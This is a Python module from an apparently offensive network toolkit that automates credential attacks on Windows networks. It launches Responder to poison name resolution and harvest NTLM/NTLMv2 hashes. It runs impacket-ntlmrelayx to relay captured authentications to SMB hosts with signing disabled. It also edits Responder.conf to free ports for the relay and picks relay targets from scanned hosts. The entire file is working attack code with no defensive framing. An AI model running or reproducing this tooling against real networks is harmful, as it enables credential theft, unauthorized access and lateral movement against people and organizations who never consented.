"""
harvest.py — Passive NTLM/NTLMv2 hash capture via Responder + optional relay
"""

import subprocess, threading, time, re, os, shutil
from . import tui

RESPONDER_PATH = "/usr/share/responder/Responder.py"
NTLM_RE        = re.compile(
    r"(\S+)::([\w\-]+):([0-9a-fA-F]+):([0-9a-fA-F]+):([0-9a-fA-F]+)"
)

_proc        = None
_relay_proc  = None
_hashes      = []
_relay_hits  = []   # { ip, user, shell_available }
_lock        = threading.Lock()


# ── Responder passive capture ─────────────────────────────────────────────────

def start(iface: str):
    """Launch Responder in background (poisoning only, no SMB/HTTP servers
    so relay can use those ports). Returns live-updating hashes list."""
    global _proc, _hashes
    _hashes = []

    if not os.path.exists(RESPONDER_PATH):
        tui.error("Responder not found — install: sudo apt install responder")
        return _hashes

    cmd = ["python3", RESPONDER_PATH, "-I", iface, "-v"]
    tui.info(f"Starting Responder on {iface} ...")
    _proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    threading.Thread(target=_reader, daemon=True).start()
    return _hashes


def _reader():
    for line in _proc.stdout:
        m = NTLM_RE.search(line)
        if m:
            user   = m.group(1)
            domain = m.group(2)
            hash_  = f"{user}::{domain}:{m.group(3)}:{m.group(4)}:{m.group(5)}"
            with _lock:
                if hash_ not in _hashes:
                    _hashes.append(hash_)
                    tui.success(f"Hash captured: {tui.YLW}{user}@{domain}{tui.R}")


def stop():
    global _proc
    if _proc:
        _proc.terminate()
        _proc = None
        tui.info("Responder stopped.")


def captured() -> list[str]:
    with _lock:
        return list(_hashes)


def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
    """Block for `timeout` seconds while Responder runs, then stop and return hashes."""
    start(iface)
    deadline = time.time() + timeout
    bar_w    = 40
    while time.time() < deadline:
        elapsed = timeout - (deadline - time.time())
        filled  = int(bar_w * elapsed / timeout)
        bar     = f"{'█' * filled}{'░' * (bar_w - filled)}"
        count   = len(captured())
        print(
            f"\r  {tui.RED}[{bar}]{tui.R}  "
            f"{tui.DIM}{int(elapsed):>3}s  {tui.GRN}{count} hash(es){tui.R}   ",
            end="", flush=True
        )
        time.sleep(1)
    print()
    stop()
    return captured()


# ── NTLM relay attack ─────────────────────────────────────────────────────────

def start_relay(targets: list[str], iface: str, timeout: int = 120) -> list[dict]:
    """
    Run impacket-ntlmrelayx against targets that have SMB signing disabled.
    Relays captured authentications in real-time — no need to crack hashes.
    Returns list of { ip, user, samba_shell } for successful relays.

    Requires: impacket-ntlmrelayx, and Responder with SMB/HTTP disabled
    (edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off).
    """
    global _relay_proc, _relay_hits
    _relay_hits = []

    exe = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
    if not exe:
        tui.error("impacket-ntlmrelayx not found — install: sudo apt install python3-impacket")
        return _relay_hits

    # Build target list file
    target_file = "/tmp/cascade_relay_targets.txt"
    with open(target_file, "w") as f:
        for t in targets:
            f.write(f"smb://{t}\n")

    tui.info(f"Starting NTLM relay → {len(targets)} target(s) ...")
    tui.info("Waiting for authentications to relay ...")

    cmd = [exe, "-tf", target_file, "-smb2support", "-of", "/tmp/cascade_relay_hashes"]
    _relay_proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    threading.Thread(target=_relay_reader, daemon=True).start()

    # Also start Responder with SMB/HTTP off so relay can use those ports
    _start_responder_relay_mode(iface)

    deadline = time.time() + timeout
    bar_w    = 40
    while time.time() < deadline:
        elapsed = timeout - (deadline - time.time())
        filled  = int(bar_w * elapsed / timeout)
        bar     = f"{'█' * filled}{'░' * (bar_w - filled)}"
        count   = len(_relay_hits)
        print(
            f"\r  {tui.RED}[{bar}]{tui.R}  "
            f"{tui.DIM}{int(elapsed):>3}s  "
            f"{tui.GRN}{count} relay hit(s){tui.R}   ",
            end="", flush=True
        )
        time.sleep(1)
    print()

    stop_relay()
    return _relay_hits


def _start_responder_relay_mode(iface: str):
    """Start Responder with SMB and HTTP disabled (relay mode)."""
    global _proc
    conf = "/etc/responder/Responder.conf"
    # Patch config to disable SMB/HTTP so ntlmrelayx can use port 445/80
    try:
        with open(conf) as f:
            content = f.read()
        patched = re.sub(r"^(SMB\s*=\s*)On", r"\1Off", content, flags=re.M)
        patched = re.sub(r"^(HTTP\s*=\s*)On", r"\1Off", patched, flags=re.M)
        with open(conf, "w") as f:
            f.write(patched)
    except Exception:
        pass

    if os.path.exists(RESPONDER_PATH):
        _proc = subprocess.Popen(
            ["python3", RESPONDER_PATH, "-I", iface, "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        threading.Thread(target=_reader, daemon=True).start()


def _relay_reader():
    for line in _relay_proc.stdout:
        # ntlmrelayx prints success lines like: [*] Authenticating against smb://x.x.x.x as DOMAIN/user SUCCEED
        m = re.search(r"Authenticating against smb://([\d.]+) as [^/]+/(\S+)\s+SUCCEED", line)
        if m:
            ip   = m.group(1)
            user = m.group(2)
            with _lock:
                entry = {"ip": ip, "user": user}
                if entry not in _relay_hits:
                    _relay_hits.append(entry)
                    tui.success(f"RELAY HIT: {tui.YLW}{user}{tui.R} → {tui.WH}{ip}{tui.R}")


def stop_relay():
    global _relay_proc, _proc
    for p in (_relay_proc, _proc):
        if p:
            try:
                p.terminate()
            except Exception:
                pass
    _relay_proc = None
    _proc       = None

    # Restore Responder.conf SMB/HTTP back to On
    conf = "/etc/responder/Responder.conf"
    try:
        with open(conf) as f:
            content = f.read()
        restored = re.sub(r"^(SMB\s*=\s*)Off", r"\1On", content, flags=re.M)
        restored = re.sub(r"^(HTTP\s*=\s*)Off", r"\1On", restored, flags=re.M)
        with open(conf, "w") as f:
            f.write(restored)
    except Exception:
        pass
    tui.info("Relay stopped. Responder.conf restored.")


def relay_targets_from_hosts(hosts: list[dict]) -> list[str]:
    """Return IPs of Windows SMB hosts with signing disabled (relay candidates)."""
    from . import lateral
    candidates = []
    for h in hosts:
        if 445 in (h.get("ports") or []):
            vulns = lateral.check_vulns(h["ip"])
            if vulns.get("signing_disabled"):
                candidates.append(h["ip"])
    return candidates
